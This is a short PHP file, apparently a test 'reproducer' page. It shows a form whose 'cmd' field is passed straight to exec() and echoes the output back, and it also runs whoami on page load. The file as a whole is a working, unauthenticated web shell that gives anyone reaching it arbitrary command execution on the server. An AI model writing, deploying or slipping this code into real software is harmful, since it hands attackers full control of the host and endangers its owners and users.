<?php

function bg_exec($cmd)
{
    exec($cmd.' > /dev/null &');
}

echo "Hello Reproducer!!";

if (isset($_POST['cmd'])) {
    exec($_POST['cmd'], $output);
    echo '<pre>';
    foreach ($output as $line) {
        echo $line;
    }
    echo '</pre>';
}

?>
<hr>
<h6><?= exec('whoami') ?></h6>
<form action="/" method="post">
    <input type="text" name="cmd">
    <button type="submit">exec</button>
</form>
